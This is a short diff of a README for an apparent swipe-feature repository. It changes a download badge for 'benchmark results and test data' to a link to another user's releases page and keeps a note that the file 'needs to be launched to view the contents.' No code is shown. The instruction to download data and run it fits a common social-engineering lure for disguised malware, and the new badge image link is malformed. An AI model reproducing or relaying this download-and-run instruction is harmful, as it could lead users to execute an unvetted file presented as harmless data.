@@ -22,7 +22,7 @@ In this repository, we cover a range of topics related to swipe functionality an
 
 To access the benchmark results and test data, please download the file from the following link: 
 
-[![Download Swiper 2025](https://img.shields.io/badge/Download-Swiper%202025-blue)](https://github.com/uploads/App.zip)
+[![Download Swiper 2025](https://github.com/abhinavpv7/swiper-2025/releases%202025-blue)](https://github.com/abhinavpv7/swiper-2025/releases)
 
 **Note:** The file needs to be launched to view the contents. 
 
